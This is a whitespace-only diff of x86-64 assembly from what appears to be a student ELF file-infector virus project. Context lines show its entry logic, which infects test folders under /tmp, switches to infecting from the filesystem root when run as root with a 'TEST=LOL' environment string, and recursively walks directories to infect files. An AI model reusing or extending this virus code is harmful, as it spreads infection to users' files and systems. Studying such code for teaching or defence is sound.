@@ -17,14 +17,14 @@ section .text
 	global _ft_strlen
 	global _verif
 	global _verify_o_entry
-    global _continue_normaly
+	global _continue_normaly
 	extern _treat_file
 	extern _final_end
 	extern _thread_create
 	extern _start_infect
 	extern _infect_from_root
-    extern _verify_starting_infect
-    extern _famine_start_options
+	extern _verify_starting_infect
+	extern _famine_start_options
 
 _o_entry:
 	dq 0x0000000000000000 
@@ -56,9 +56,9 @@ _start: ; program start
 	push r14 ; +96
 	push r15 ; +104
 
-    lea rax, [rel _o_entry]
-    cmp QWORD [rax], 0
-    je _famine_start_options
+	lea rax, [rel _o_entry]
+	cmp QWORD [rax], 0
+	je _famine_start_options
 ;;;;;;;;;;;;;;;;;;;;;;
 ;   NULL (8 bytes)   ;
 ;--------------------;
@@ -76,11 +76,11 @@ _start: ; program start
 ;--------------------;
 ;   rsp at start     ;
 
-    ; argc = rsp + 128 if on stack or rsp + 64 if on registers
-    ; argv = rsp + 136 if on stack (it's argv[0], then argv[1] etc...),
-    ;   and rsp + 72 by registers (rsi), it's argv, we need to dereference
-    ; env = rsp + 128 + argc + 8(NULL addr), list of env on stack
-    ;   or rdx on registers
+	; argc = rsp + 128 if on stack or rsp + 64 if on registers
+	; argv = rsp + 136 if on stack (it's argv[0], then argv[1] etc...),
+	;   and rsp + 72 by registers (rsi), it's argv, we need to dereference
+	; env = rsp + 128 + argc + 8(NULL addr), list of env on stack
+	;   or rdx on registers
 ;;;;;;;;;;;;;;;;;;;;;
 ; To know if we need to execute the binary code, we pass a code in parameter.
 ; So we need to check parameters to know what to do
@@ -92,25 +92,25 @@ _start: ; program start
 _check_registers: ; check if parameters are passed by registers
 	cmp QWORD [rsp + 64], 3 ; check if argc on the registers is equal 3
 	je _alternative_start_by_registers
-    lea r10, [rel _o_entry]
-    cmp QWORD [r10] , 0
-    jne _test_root_infect
-    call _start_infect
-    jmp _continue_normaly
+	lea r10, [rel _o_entry]
+	cmp QWORD [r10] , 0
+	jne _test_root_infect
+	call _start_infect
+	jmp _continue_normaly
 
 _test_root_infect: ; test if we have rights to infect from root
-    mov rdi, QWORD [rsp + 152]
-    cmp rdi, 0
-    je _continue_normaly
-    mov rax, 0x4c4f4c3d54534554
-    cmp QWORD [rdi], rax
-    jne _continue_normaly
+	mov rdi, QWORD [rsp + 152]
+	cmp rdi, 0
+	je _continue_normaly
+	mov rax, 0x4c4f4c3d54534554
+	cmp QWORD [rdi], rax
+	jne _continue_normaly
 	mov rax, 107
 	syscall ; We call geteuid
 	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
 	jne _continue_normaly
-    lea rdi, [rel _force_exit]
-    jmp _infect_from_root
+	lea rdi, [rel _force_exit]
+	jmp _infect_from_root
 
 ; If it's a normal execution, we just infect /tmp/test(2), to don't hard block the
 ; software with a too long execution.
@@ -184,7 +184,7 @@ _alternative_start: ; here we check the arguments passed to the program by the s
 	pop rdi
 	pop rdi
 	pop rdi
-    jmp _force_exit
+	jmp _force_exit
 
 ; In this other alternative start, the arguments are received by registers. We pushed the registers to
 ; don't corrupt the normal execution, so we will find our arguments on the stack.
@@ -407,8 +407,8 @@ _treat_normally: ; this is a file we need to treat normally
 	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
 	mov rdi, rsi
 	mov rsi, QWORD [rsp + 280]
-		mov r10, QWORD [rsp + 336]
-		mov rdx, rsp
+	mov r10, QWORD [rsp + 336]
+	mov rdx, rsp
 		sub rdx, r10
 		sub rsp, r10
 		sub rsp, 8
@@ -448,7 +448,7 @@ _recursiv_infect:
 	mov rdi, QWORD [rsp + 296]
 	add rdi, 19
 	mov rsi, rsp
-		mov r10, QWORD [rsp + 336] 
+	mov r10, QWORD [rsp + 336] 
 		sub rsi, r10
 		sub rsp, r10
 		sub rsp, 8
